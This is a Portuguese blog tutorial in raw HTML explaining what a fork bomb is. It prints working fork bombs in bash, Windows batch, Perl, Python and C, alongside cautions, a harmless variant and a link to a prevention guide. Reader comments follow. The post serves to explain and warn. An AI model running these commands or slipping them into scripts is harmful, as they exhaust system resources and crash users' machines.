" data-medium-file="https://i0.wp.com/elias.praciano.com/wp-content/uploads/2014/11/error.png?fit=48%2C48&amp;ssl=1" data-large-file="https://i0.wp.com/elias.praciano.com/wp-content/uploads/2014/11/error.png?fit=48%2C48&amp;ssl=1" src="https://elias.praciano.com/wp-content/plugins/jetpack/modules/lazy-images/images/1x1.trans.gif" alt="error icon" width="48" height="48" class="alignleft size-full wp-image-1876" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/elias.praciano.com/wp-content/uploads/2014/11/error.png?resize=48%2C48&#038;ssl=1"><noscript><img data-attachment-id="1876" data-permalink="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/error/" data-orig-file="https://i0.wp.com/elias.praciano.com/wp-content/uploads/2014/11/error.png?fit=48%2C48&amp;ssl=1" data-orig-size="48,48" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="error" data-image-description="&lt;p&gt;Perigo!&lt;/p&gt;
" data-medium-file="https://i0.wp.com/elias.praciano.com/wp-content/uploads/2014/11/error.png?fit=48%2C48&amp;ssl=1" data-large-file="https://i0.wp.com/elias.praciano.com/wp-content/uploads/2014/11/error.png?fit=48%2C48&amp;ssl=1" src="https://i0.wp.com/elias.praciano.com/wp-content/uploads/2014/11/error.png?resize=48%2C48&#038;ssl=1" alt="error icon" width="48" height="48" class="alignleft size-full wp-image-1876" data-recalc-dims="1" /></noscript></a>O código abaixo é um dos mais conhecidos e torna o seu sistema cada vez mais lento, a ponto de parar de responder completamente.<br />
Este código e todos os outros, neste artigo, <strong>podem quebrar o seu sistema. Seja responsável</strong>!</p>
<pre class="brush: bash; gutter: false; title: ; notranslate" title="">:(){ :|: &amp; };:</pre>
<p>O seu funcionamento é o seguinte:</p>
<ul>
<li><code>:()</code> &mdash; cria/define uma função chamada <code>:</code></li>
<li><code>{:|: &}</code> &mdash; roda a função <code>:</code> e direciona sua saída para a função <code>:</code> e a executa nos bastidores</li>
<li><code>;</code> &mdash; este caractere funciona como separador, na linha de comandos. Equivale a <code>&&</code> e permite iniciar uma outra instrução</li>
<li><code>:</code> &mdash; executa a função definida no início</li>
</ul>
<p>É possível desarmar esta bomba com <a href="https://elias.praciano.com/2014/02/como-matar-programas-no-linux/" title="Como matar processos no Linux" target="_blank">o comando kill</a>, no Linux &mdash; mas você provavelmente vai precisar ser muito rápido para fazer isto antes que seu sistema morra por inanição de recursos.<br />
Uma outra forma, mais compreensível, de obter o mesmo resultado nefasto é assim:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate" title="">bomba()
 {
bomba | bomba &amp;
 }; bomba</pre>
<p>No código, acima, fica mais claro ver a função <em>executar-se a si mesma</em>.<br />
Se você gostaria de ver um exemplo <strong>não malicioso</strong> de execução de uma fork bomb, o código abaixo é seguro para você experimentar:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate" title="">fork_bomb(){ echo &quot;FORK BOMB&quot;; };
fork_bomb</pre>
<p>No terminal, ele pode ser interrompido com Ctrl+C.</p>
<h2>Como criar uma fork bomb no Windows</h2>
<p>Você pode criar um arquivo <code>.bat</code>, com o seguinte conteúdo:</p>
<pre class="brush: bash; title: ; notranslate" title="">:bomba
start %0
goto bomba</pre>
<p>Ou rodar este código:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate" title="">%0|%0</pre>
<p>As fork bombs funcionam como esquemas de negação de serviço (<em>denial of service</em>) &mdash; elas devoram os recursos do sistema.</p>
<h2>Como criar uma fork bomb em Perl, Python e em C</h2>
<p>Exemplo em Perl:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate" title="">perl -e &quot;fork while fork&quot; &amp;</pre>
<p>Em Python:</p>
<pre class="brush: python; gutter: false; title: ; notranslate" title="">import os
  while(1):
      os.fork()</pre>
<p>E, por último, uma fork bomb em linguagem C:</p>
<pre class="brush: cpp; title: ; notranslate" title="">#include
int main()
 {
   while(1)
      fork();
 }</pre>
<h4>Referências</h4>
<p><a href="https://elias.praciano.com/2014/11/como-se-prevenir-de-fork-bombs/" target="_blank">Como se prevenir de uma fork bomb</a>.<br />
<a href="https://elias.praciano.com/2013/07/lista-de-4-comandos-mortais-que-voce-nunca-deve-executar-no-linux/" target="_blank">Comandos fatais para Linux</a>.<br />
<a href="http://www.cyberciti.biz/faq/understanding-bash-fork-bomb/" title="http://www.cyberciti.biz/faq/understanding-bash-fork-bomb/" target="_blank">Cyberciti &mdash; Understanding fork bomb</a>.<br />
<a href="http://linuxconfig.org/how-to-crash-your-linux-system-with-fork-bomb" title="http://linuxconfig.org/how-to-crash-your-linux-system-with-fork-bomb" target="_blank">Linuxconfig &mdash; How to crash your system with a fork bomb</a>.<br />
<a href="http://pt.wikipedia.org/wiki/Elmer_Fudd" title="Wikipedia - Hortelino Troca-letras" target="_blank">Hortelino Troca-Letras (Elmer Fudd) &mdash; http://pt.wikipedia.org/wiki/Elmer_Fudd</a>.<br />
<a href="http://catb.org/~esr/jargon/html/W/wabbit.html" title="Hacker jargon - wabbit" target="_blank">The hackers jargon &mdash; http://catb.org/~esr/jargon/html/W/wabbit.html</a>.</p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Compartilhe este post!</h3><div class="sd-content"><ul><li class="share-facebook"><a rel="nofollow" data-shared="sharing-facebook-1875" class="share-facebook sd-button share-icon" href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/?share=facebook" target="_blank" title="Clique para compartilhar no Facebook"><span>Facebook</span></a></li><li class="share-twitter"><a rel="nofollow" data-shared="sharing-twitter-1875" class="share-twitter sd-button share-icon" href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/?share=twitter" target="_blank" title="Clique para compartilhar no Twitter"><span>Twitter</span></a></li><li class="share-google-plus-1"><a rel="nofollow" data-shared="sharing-google-1875" class="share-google-plus-1 sd-button share-icon" href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/?share=google-plus-1" target="_blank" title="Compartilhe no Google+"><span>Google</span></a></li><li class="share-telegram"><a rel="nofollow" data-shared="" class="share-telegram sd-button share-icon" href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/?share=telegram" target="_blank" title="Clique para compartilhar no Telegram"><span>Telegram</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow" data-shared="" class="share-jetpack-whatsapp sd-button share-icon" href="https://api.whatsapp.com/send?text=O%20que%20%C3%A9%20uma%20fork%20bomb%3F https%3A%2F%2Felias.praciano.com%2F2014%2F11%2Fo-que-e-uma-fork-bomb%2F" target="_blank" title="Clique para compartilhar no WhatsApp"><span>WhatsApp</span></a></li><li class="share-reddit"><a rel="nofollow" data-shared="" class="share-reddit sd-button share-icon" href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/?share=reddit" target="_blank" title="Clique para compartilhar no Reddit"><span>Reddit</span></a></li><li><a href="#" class="sharing-anchor sd-button share-more"><span>Mais</span></a></li><li class="share-end"></li></ul><div class="sharing-hidden"><div class="inner" style="display: none;"><ul><li class="share-linkedin"><a rel="nofollow" data-shared="sharing-linkedin-1875" class="share-linkedin sd-button share-icon" href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/?share=linkedin" target="_blank" title="Clique para compartilhar no LinkedIn"><span>LinkedIn</span></a></li><li class="share-pocket"><a rel="nofollow" data-shared="" class="share-pocket sd-button share-icon" href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/?share=pocket" target="_blank" title="Clique para compartilhar no Pocket"><span>Pocket</span></a></li><li class="share-end"></li><li class="share-print"><a rel="nofollow" data-shared="" class="share-print sd-button share-icon" href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/#print" target="_blank" title="Clique para imprimir"><span>Imprimir</span></a></li><li class="share-email"><a rel="nofollow" data-shared="" class="share-email sd-button share-icon" href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/?share=email" target="_blank" title="Clique para enviar por e-mail a um amigo"><span>E-mail</span></a></li><li class="share-end"></li><li class="share-end"></li></ul></div></div></div></div></div><div class='sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded' id='like-post-wrapper-57584195-1875-5a95de128572d' data-src='https://widgets.wp.com/likes/#blog_id=57584195&amp;post_id=1875&amp;origin=elias.praciano.com&amp;obj_id=57584195-1875-5a95de128572d' data-name='like-post-frame-57584195-1875-5a95de128572d'><h3 class="sd-title">Curtir isso:</h3><div class='likes-widget-placeholder post-likes-widget-placeholder' style='height: 55px;'><span class='button'><span>Curtir</span></span> <span class="loading">Carregando...</span></div><span class='sd-text-color'></span><a class='sd-link-color'></a></div>
<div id='jp-relatedposts' class='jp-relatedposts' >
	<h3 class="jp-relatedposts-headline"><em>Relacionado</em></h3>
</div>	</div><!-- .entry-content -->

	
<div class="author-info">
	<h2 class="author-heading">Publicado por</h2>
	<div class="author-avatar">
		<img alt src="https://elias.praciano.com/wp-content/plugins/jetpack/modules/lazy-images/images/1x1.trans.gif" class="avatar avatar-56 photo" height="56" width="56" data-lazy-src="https://secure.gravatar.com/avatar/b9ad122d7c325ffddbf3542dcbc704b4?s=56&#038;d=monsterid&#038;r=g" data-lazy-srcset="https://secure.gravatar.com/avatar/b9ad122d7c325ffddbf3542dcbc704b4?s=112&#038;d=monsterid&#038;r=g 2x"><noscript><img alt='' src='https://secure.gravatar.com/avatar/b9ad122d7c325ffddbf3542dcbc704b4?s=56&#038;d=monsterid&#038;r=g' srcset='https://secure.gravatar.com/avatar/b9ad122d7c325ffddbf3542dcbc704b4?s=112&#038;d=monsterid&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' /></noscript>	</div><!-- .author-avatar -->

	<div class="author-description">
		<h3 class="author-title">Elias Praciano</h3>

		<p class="author-bio">
			Autor de tecnologia (livre, de preferência), apaixonado por programação e astronomia.
Fã de séries, como "Rick and Morty" e "BoJack Horseman".
<a href="https://twitter.com/coisasdogeek" rel="noopener">Me siga no Twitter</a> e vamos trocar ideias!			<a class="author-link" href="https://elias.praciano.com/author/budspencer/" rel="author">
				Ver todos os posts de Elias Praciano			</a>
		</p><!-- .author-bio -->

	</div><!-- .author-description -->
</div><!-- .author-info -->

	<footer class="entry-footer">
		<span class="posted-on"><span class="screen-reader-text">Publicado em </span><a href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/" rel="bookmark"><time class="entry-date published" datetime="2014-11-14T14:26:31+00:00">14/11/2014</time><time class="updated" datetime="2016-10-31T10:46:48+00:00">31/10/2016</time></a></span><span class="byline"><span class="author vcard"><span class="screen-reader-text">Autor </span><a class="url fn n" href="https://elias.praciano.com/author/budspencer/">Elias Praciano</a></span></span><span class="cat-links"><span class="screen-reader-text">Categorias </span><a href="https://elias.praciano.com/category/programacao/" rel="category tag">Programação</a>, <a href="https://elias.praciano.com/category/tutoriais/" rel="category tag">Tutoriais</a>, <a href="https://elias.praciano.com/category/linux/ubuntu-2/" rel="category tag">Ubuntu</a></span><span class="tags-links"><span class="screen-reader-text">Tags </span><a href="https://elias.praciano.com/tag/bash/" rel="tag">bash</a>, <a href="https://elias.praciano.com/tag/c/" rel="tag">C++</a>, <a href="https://elias.praciano.com/tag/dos/" rel="tag">DoS</a>, <a href="https://elias.praciano.com/tag/fork-bomb/" rel="tag">fork bomb</a>, <a href="https://elias.praciano.com/tag/perl/" rel="tag">perl</a>, <a href="https://elias.praciano.com/tag/python/" rel="tag">python</a>, <a href="https://elias.praciano.com/tag/seguranca/" rel="tag">segurança</a>, <a href="https://elias.praciano.com/tag/sistemas-operacionais/" rel="tag">sistemas operacionais</a></span>			</footer><!-- .entry-footer -->

</article><!-- #post-## -->

<div id="comments" class="comments-area">

			<h2 class="comments-title">
			7 comentários sobre &ldquo;O que é uma fork bomb?&rdquo;		</h2>

		
		<ol class="comment-list">
					<li id="comment-39580" class="comment even thread-even depth-1 parent">
			<article id="div-comment-39580" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt src="https://elias.praciano.com/wp-content/plugins/jetpack/modules/lazy-images/images/1x1.trans.gif" class="avatar avatar-56 photo" height="56" width="56" data-lazy-src="https://secure.gravatar.com/avatar/68f60db72d87d47129230f24b9478977?s=56&#038;d=monsterid&#038;r=g" data-lazy-srcset="https://secure.gravatar.com/avatar/68f60db72d87d47129230f24b9478977?s=112&#038;d=monsterid&#038;r=g 2x"><noscript><img alt='' src='https://secure.gravatar.com/avatar/68f60db72d87d47129230f24b9478977?s=56&#038;d=monsterid&#038;r=g' srcset='https://secure.gravatar.com/avatar/68f60db72d87d47129230f24b9478977?s=112&#038;d=monsterid&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' /></noscript>						<b class="fn">ALAN MAURO</b> <span class="says">disse:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/#comment-39580">
							<time datetime="2016-04-29T21:40:11+00:00">
								29/04/2016 às 21:40							</time>
						</a>
											</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>e como eu me previno em WINs 7 ou 8</p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/?replytocom=39580#respond' onclick='return addComment.moveForm( "div-comment-39580", "39580", "respond", "1875" )' aria-label='Responder para ALAN MAURO'>Responder</a></div>			</article><!-- .comment-body -->
<ol class="children">
		<li id="comment-39664" class="comment byuser comment-author-budspencer bypostauthor odd alt depth-2 parent">
			<article id="div-comment-39664" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt src="https://elias.praciano.com/wp-content/plugins/jetpack/modules/lazy-images/images/1x1.trans.gif" class="avatar avatar-56 photo" height="56" width="56" data-lazy-src="https://secure.gravatar.com/avatar/b9ad122d7c325ffddbf3542dcbc704b4?s=56&#038;d=monsterid&#038;r=g" data-lazy-srcset="https://secure.gravatar.com/avatar/b9ad122d7c325ffddbf3542dcbc704b4?s=112&#038;d=monsterid&#038;r=g 2x"><noscript><img alt='' src='https://secure.gravatar.com/avatar/b9ad122d7c325ffddbf3542dcbc704b4?s=56&#038;d=monsterid&#038;r=g' srcset='https://secure.gravatar.com/avatar/b9ad122d7c325ffddbf3542dcbc704b4?s=112&#038;d=monsterid&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' /></noscript>						<b class="fn"><a href='https://elias.praciano.com' rel='external nofollow' class='url'>Elias Praciano</a></b> <span class="says">disse:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/#comment-39664">
							<time datetime="2016-05-03T09:08:21+00:00">
								03/05/2016 às 09:08							</time>
						</a>
											</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Se você está preocupado com a segurança do seu sistema, não deveria usar Windows.</p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/?replytocom=39664#respond' onclick='return addComment.moveForm( "div-comment-39664", "39664", "respond", "1875" )' aria-label='Responder para Elias Praciano'>Responder</a></div>			</article><!-- .comment-body -->
<ol class="children">
		<li id="comment-40922" class="comment even depth-3">
			<article id="div-comment-40922" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt src="https://elias.praciano.com/wp-content/plugins/jetpack/modules/lazy-images/images/1x1.trans.gif" class="avatar avatar-56 photo" height="56" width="56" data-lazy-src="https://secure.gravatar.com/avatar/1e0b4ae1a6daa0a04e0165b5db9c7c4d?s=56&#038;d=monsterid&#038;r=g" data-lazy-srcset="https://secure.gravatar.com/avatar/1e0b4ae1a6daa0a04e0165b5db9c7c4d?s=112&#038;d=monsterid&#038;r=g 2x"><noscript><img alt='' src='https://secure.gravatar.com/avatar/1e0b4ae1a6daa0a04e0165b5db9c7c4d?s=56&#038;d=monsterid&#038;r=g' srcset='https://secure.gravatar.com/avatar/1e0b4ae1a6daa0a04e0165b5db9c7c4d?s=112&#038;d=monsterid&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' /></noscript>						<b class="fn">Jonas Campos</b> <span class="says">disse:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/#comment-40922">
							<time datetime="2016-06-22T13:37:27+00:00">
								22/06/2016 às 13:37							</time>
						</a>
											</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>A melhor reposta! xD</p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/?replytocom=40922#respond' onclick='return addComment.moveForm( "div-comment-40922", "40922", "respond", "1875" )' aria-label='Responder para Jonas Campos'>Responder</a></div>			</article><!-- .comment-body -->
</li><!-- #comment-## -->
		<li id="comment-44665" class="comment odd alt depth-3">
			<article id="div-comment-44665" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt src="https://elias.praciano.com/wp-content/plugins/jetpack/modules/lazy-images/images/1x1.trans.gif" class="avatar avatar-56 photo" height="56" width="56" data-lazy-src="https://secure.gravatar.com/avatar/69f0907927096e71c5f8098a366ebdd6?s=56&#038;d=monsterid&#038;r=g" data-lazy-srcset="https://secure.gravatar.com/avatar/69f0907927096e71c5f8098a366ebdd6?s=112&#038;d=monsterid&#038;r=g 2x"><noscript><img alt='' src='https://secure.gravatar.com/avatar/69f0907927096e71c5f8098a366ebdd6?s=56&#038;d=monsterid&#038;r=g' srcset='https://secure.gravatar.com/avatar/69f0907927096e71c5f8098a366ebdd6?s=112&#038;d=monsterid&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' /></noscript>						<b class="fn"><a href='https://fsocietybrasil.tk/linux' rel='external nofollow' class='url'>Thauã</a></b> <span class="says">disse:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/#comment-44665">
							<time datetime="2016-10-31T00:31:28+00:00">
								31/10/2016 às 00:31							</time>
						</a>
											</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>AO VIVO</p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/?replytocom=44665#respond' onclick='return addComment.moveForm( "div-comment-44665", "44665", "respond", "1875" )' aria-label='Responder para Thauã'>Responder</a></div>			</article><!-- .comment-body -->
</li><!-- #comment-## -->
		<li id="comment-45078" class="comment even depth-3">
			<article id="div-comment-45078" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt src="https://elias.praciano.com/wp-content/plugins/jetpack/modules/lazy-images/images/1x1.trans.gif" class="avatar avatar-56 photo" height="56" width="56" data-lazy-src="https://secure.gravatar.com/avatar/1e28307c68297e3d93fec89f306af6c0?s=56&#038;d=monsterid&#038;r=g" data-lazy-srcset="https://secure.gravatar.com/avatar/1e28307c68297e3d93fec89f306af6c0?s=112&#038;d=monsterid&#038;r=g 2x"><noscript><img alt='' src='https://secure.gravatar.com/avatar/1e28307c68297e3d93fec89f306af6c0?s=56&#038;d=monsterid&#038;r=g' srcset='https://secure.gravatar.com/avatar/1e28307c68297e3d93fec89f306af6c0?s=112&#038;d=monsterid&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' /></noscript>						<b class="fn">Henrique Secundo</b> <span class="says">disse:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/#comment-45078">
							<time datetime="2016-11-12T17:12:25+00:00">
								12/11/2016 às 17:12							</time>
						</a>
											</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Pura verdade</p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/?replytocom=45078#respond' onclick='return addComment.moveForm( "div-comment-45078", "45078", "respond", "1875" )' aria-label='Responder para Henrique Secundo'>Responder</a></div>			</article><!-- .comment-body -->
</li><!-- #comment-## -->
</ol><!-- .children -->
</li><!-- #comment-## -->
</ol><!-- .children -->
</li><!-- #comment-## -->
		<li id="comment-39461" class="comment odd alt thread-odd thread-alt depth-1 parent">
			<article id="div-comment-39461" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt src="https://elias.praciano.com/wp-content/plugins/jetpack/modules/lazy-images/images/1x1.trans.gif" class="avatar avatar-56 photo" height="56" width="56" data-lazy-src="https://secure.gravatar.com/avatar/68f60db72d87d47129230f24b9478977?s=56&#038;d=monsterid&#038;r=g" data-lazy-srcset="https://secure.gravatar.com/avatar/68f60db72d87d47129230f24b9478977?s=112&#038;d=monsterid&#038;r=g 2x"><noscript><img alt='' src='https://secure.gravatar.com/avatar/68f60db72d87d47129230f24b9478977?s=56&#038;d=monsterid&#038;r=g' srcset='https://secure.gravatar.com/avatar/68f60db72d87d47129230f24b9478977?s=112&#038;d=monsterid&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' /></noscript>						<b class="fn"><a href='https://plus.google.com/112960380131046126905' rel='external nofollow' class='url'>alan mauro</a></b> <span class="says">disse:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/#comment-39461">
							<time datetime="2016-04-24T20:28:20+00:00">
								24/04/2016 às 20:28							</time>
						</a>
											</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>opa ola gostei sobre o assunto sobre forks&#8230;vc teria mais artigos onde posso me basear</p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/?replytocom=39461#respond' onclick='return addComment.moveForm( "div-comment-39461", "39461", "respond", "1875" )' aria-label='Responder para alan mauro'>Responder</a></div>			</article><!-- .comment-body -->
<ol class="children">
		<li id="comment-39472" class="comment byuser comment-author-budspencer bypostauthor even depth-2">
			<article id="div-comment-39472" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt src="https://elias.praciano.com/wp-content/plugins/jetpack/modules/lazy-images/images/1x1.trans.gif" class="avatar avatar-56 photo" height="56" width="56" data-lazy-src="https://secure.gravatar.com/avatar/b9ad122d7c325ffddbf3542dcbc704b4?s=56&#038;d=monsterid&#038;r=g" data-lazy-srcset="https://secure.gravatar.com/avatar/b9ad122d7c325ffddbf3542dcbc704b4?s=112&#038;d=monsterid&#038;r=g 2x"><noscript><img alt='' src='https://secure.gravatar.com/avatar/b9ad122d7c325ffddbf3542dcbc704b4?s=56&#038;d=monsterid&#038;r=g' srcset='https://secure.gravatar.com/avatar/b9ad122d7c325ffddbf3542dcbc704b4?s=112&#038;d=monsterid&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' /></noscript>						<b class="fn"><a href='https://elias.praciano.com' rel='external nofollow' class='url'>Elias Praciano</a></b> <span class="says">disse:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/#comment-39472">
							<time datetime="2016-04-25T08:07:53+00:00">
								25/04/2016 às 08:07							</time>
						</a>
											</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Concordo que o assunto é interessante. 😉<br />
Pretendo escrever mais sobre o tema.<br />
Até o momento, há o artigo <a href="https://elias.praciano.com/2014/11/como-se-prevenir-de-fork-bombs/" target="_blank">Como se prevenir de <em>fork bombs</em> no Linux, usando nproc e ulimit</a>, com vídeo.</p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/?replytocom=39472#respond' onclick='return addComment.moveForm( "div-comment-39472", "39472", "respond", "1875" )' aria-label='Responder para Elias Praciano'>Responder</a></div>			</article><!-- .comment-body -->
</li><!-- #comment-## -->
</ol><!-- .children -->
</li><!-- #comment-## -->
		</ol><!-- .comment-list -->

		
	
	
		<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Deixe uma resposta <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2014/11/o-que-e-uma-fork-bomb/#respond" style="display:none;">Cancelar resposta</a></small></h3>			<form action="https://elias.praciano.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate>
				<p class="comment-notes"><span id="email-notes">O seu endereço de e-mail não será publicado.</span> Campos obrigatórios são marcados com <span class="required">*</span></p><p class="comment-form-comment"><label for="comment">Comentário</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" aria-required="true" required="required"></textarea></p><p class="comment-form-author"><label for="author">Nome <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" aria-required='true' required='required' /></p>
<p class="comment-form-email"><label for="email">E-mail <span class="required">*</span></label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" aria-required='true' required='required' /></p>
<p class="comment-form-url"><label for="url">Site</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p>
<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Publicar comentário" /> <input type='hidden' name='comment_post_ID' value='1875' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="1c8aa768fe" /></p><p class="comment-subscription-form"><input type="checkbox" name="subscribe_comments" id="subscribe_comments" value="subscribe" style="width: auto; -moz-appearance: checkbox; -webkit-appearance: checkbox;" /> <label class="subscribe-label" id="subscribe-label" for="subscribe_comments">Notifique-me sobre novos comentários por e-mail.</label></p><p class="comment-subscription-form"><input type="checkbox" name="subscribe_blog" id="subscribe_blog" value="subscribe" style="width: auto; -moz-appearance: checkbox; -webkit-appearance: checkbox;" /> <label class="subscribe-label" id="subscribe-blog-label" for="subscribe_blog">Notifique-me sobre novas publicações por e-mail.</label></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="159"/></p>			</form>
			</div><!-- #respond -->
	
</div><!-- .comments-area -->

	<nav class="navigation post-navigation" role="navigation">
		<h2 class="screen-reader-text">Navegação de Post</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://elias.praciano.com/2014/11/como-instalar-o-emulador-de-terminal-drop-down-tilda/" rel="prev"><span class="meta-nav" aria-hidden="true">Anterior</span> <span class="screen-reader-text">Post anterior:</span> <span class="post-title">Como instalar o emulador de terminal drop-down Tilda.</span></a></div><div class="nav-next"><a href="https://elias.praciano.com/2014/11/como-se-prevenir-de-fork-bombs/" rel="next"><span class="meta-nav" aria-hidden="true">Seguinte</span> <span class="screen-reader-text">Próximo post:</span> <span class="post-title">Como se prevenir de fork bombs no Linux, usando nproc e ulimit</span></a></div></div>
	</nav>
		</main><!-- .site-main -->
	</div><!-- .content-area -->


	</div><!-- .site-content -->

	<footer id="colophon" class="site-footer" role="contentinfo">
		<div class="site-info">
						<a href="https://br.wordpress.org/">Orgulhosamente mantido com WordPress</a>
		</div><!-- .site-info -->
	</footer><!-- .site-footer -->

</div><!-- .site -->

	<div style="display:none">
	<div class="grofile-hash-map-b9ad122d7c325ffddbf3542dcbc704b4">
	</div>
	<div class="grofile-hash-map-68f60db72d87d47129230f24b9478977">
	</div>
	<div class="grofile-hash-map-b9ad122d7c325ffddbf3542dcbc704b4">
	</div>
	<div class="grofile-hash-map-1e0b4ae1a6daa0a04e0165b5db9c7c4d">
	</div>
	<div class="grofile-hash-map-69f0907927096e71c5f8098a366ebdd6">
	</div>
	<div class="grofile-hash-map-1e28307c68297e3d93fec89f306af6c0">
	</div>
	</div>

	<script type="text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/elias.praciano.com\/2014\/11\/o-que-e-uma-fork-bomb\/":1875};
	</script>
	<div id="sharing_email" style="display: none;">
		<form action="/2014/11/o-que-e-uma-fork-bomb/" method="post">
			<label for="target_email">Enviar para oendereço de e-mail</label>
			<input type="email" name="target_email" id="target_email" value="" />

			
				<label for="source_name">Seu Nome</label>
				<input type="text" name="source_name" id="source_name" value="" />

				<label for="source_email">Seu endereço de e-mail</label>
				<input type="email" name="source_email" id="source_email" value="" />

						<input type="text" id="jetpack-source_f_name" name="source_f_name" class="input" value="" size="25" autocomplete="off" title="Este campo é para validação e não deve ser alterado" />
			
			<img style="float: right; display: none" class="loading" src="https://elias.praciano.com/wp-content/plugins/jetpack/modules/sharedaddy/images/loading.gif" alt="loading" width="16" height="16" />
			<input type="submit" value="Enviar e-mail" class="sharing_send" />
			<a rel="nofollow" href="#cancel" class="sharing_cancel">Cancelar</a>

			<div class="errors errors-1" style="display: none;">
				Post não foi enviado - verifique os seus endereços de e-mail!			</div>

			<div class="errors errors-2" style="display: none;">
